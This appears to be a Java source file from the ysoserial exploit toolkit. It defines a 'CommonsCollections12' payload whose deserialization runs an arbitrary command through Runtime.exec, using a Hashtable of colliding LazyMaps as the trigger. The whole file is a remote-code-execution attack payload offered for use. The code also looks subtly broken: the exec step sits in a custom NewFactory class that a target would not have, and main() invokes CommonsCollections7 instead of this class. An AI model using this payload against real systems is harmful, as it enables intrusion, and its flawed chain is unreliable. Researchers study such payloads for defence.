package ysoserial.payloads;

import org.apache.commons.collections.Factory;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

import java.io.IOException;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/*
    Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    NewFactory.create
    java.lang.Runtime.exec
*/

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.PH4NT0MER})

public class CommonsCollections12 extends PayloadRunner implements ObjectPayload<Hashtable> {

    public Hashtable getObject(final String command) throws Exception {

        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{command};


        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        NewFactory newFactory = new NewFactory(execArgs);

        Map lazyMap1 = LazyMap.decorate(innerMap1, newFactory);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, newFactory);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);


        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections7.class, args);
    }

    static class NewFactory implements Serializable, Factory {

        private final String[] execArgs;

        public NewFactory(final String[] execArgs) {
            this.execArgs = execArgs;
        }

        @Override
        public Object create() {
//            exploit
            try {
                if (this.execArgs != null) {
                    Runtime.getRuntime().exec(this.execArgs);
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            return null;
        }
    }
}
